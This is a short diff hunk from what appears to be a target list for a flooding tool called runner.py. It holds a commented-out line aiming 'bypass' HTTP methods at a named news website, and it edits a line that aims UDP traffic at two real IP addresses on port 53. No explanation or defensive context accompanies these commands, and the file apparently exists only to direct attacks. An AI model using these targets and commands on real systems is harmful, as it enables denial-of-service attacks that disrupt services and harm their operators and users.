@@ -13,4 +13,4 @@
 
 #runner.py https://tsargrad.tv/ http://tsargrad.tv/ --http-methods bypass cfb dgb
 
-runner.py udp://92.223.100.53:53 udp://92.223.77.53:53 --http-methods UDP
+udp://92.223.100.53:53 udp://92.223.77.53:53 --http-methods UDP
